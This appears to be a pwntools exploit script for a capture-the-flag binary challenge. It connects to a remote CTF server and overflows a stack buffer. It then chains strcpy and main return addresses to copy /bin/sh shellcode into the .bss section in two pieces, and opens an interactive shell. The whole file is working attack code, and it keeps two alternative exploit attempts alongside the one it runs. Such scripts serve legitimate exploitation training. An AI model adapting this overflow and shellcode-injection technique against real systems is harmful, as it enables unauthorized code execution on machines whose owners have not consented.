from pwn import *

def get_payload_len():

    return cyclic(28).find(p32(0x66616161))

if __debug__:
    r = remote('csie.ctf.tw', 10130)
else:
    r = remote('127.0.0.1', 10130)

elf = ELF('./shellcode-5cdde7f51ec5a7f9e94800716d04f60f')
'''
print hex(elf.symbols['read'])
'''
buf = 0x804a060
buf2 = elf.bss() + 0xf00
main = 0x8048588
call_read = 0x8048602

read_plt = elf.symbols['read']
puts_plt = elf.symbols['puts']
strcpy_plt = elf.symbols['strcpy']

shellcode = asm(shellcraft.sh())
#print hex(u32(shellcode[17:21]))
r.recvrepeat(0.1)

print hex(buf2)
print get_payload_len()

raw_input()

def copy():

    n = 14
    payload = shellcode[:n]
    payload += '\x00' * (get_payload_len() - n)
    payload += p32(strcpy_plt)
    payload += p32(main)
    payload += p32(buf2)
    payload += p32(buf)
    print len(payload)
    r.send(payload + '\n')
    print r.recvrepeat(0.5)

#    payload = shellcode[n:]
#    payload += '\x00' * (cyclic(30).find(p32(0x64616161)) - (len(shellcode) - n))
    payload = shellcode[n:]
    payload += '\x00'
    payload += p32(strcpy_plt)
    payload += p32(buf2)
    payload += p32(buf2 + n)
    payload += p32(buf)
    print len(payload)
    r.send(payload + '\n')
    print r.recvrepeat(0.5)

    r.interactive()

def must_ok():
    r.send('\x00' * get_payload_len() +
            p32(0xdeadbeef) +
   #        p32(read_plt) +
   #        p32(buf) +
   #        p32(0) +
   #        p32(buf) +
   #        p32(0x100)
           '\n'
    )
    r.send(shellcode + '\n')
    print r.recvrepeat(0.5)
    r.interactive()

def test():
    n = 11
    payload = shellcode[:n]
    payload += '\x00' * (get_payload_len() - n)
    payload += p32(call_read)
    payload += p32(0)
    payload += p32(buf)
    #payload += p32(len(payload) + 4)
    print len(payload)
    r.send(payload +
            '\n'
    )
    print r.recvrepeat(0.5)

    # after jump to main, got the second chance to inject shellcode
    # read(0, buf+k, len)
    payload = shellcode[n:]
    payload += '\x00' * (get_payload_len() - (len(shellcode) - n))
    payload += p32(0xdeadbeef)
    print len(payload)
    r.send(payload +
            '\n'
    )
    print r.recvrepeat(0.5)
    r.interactive()

copy()
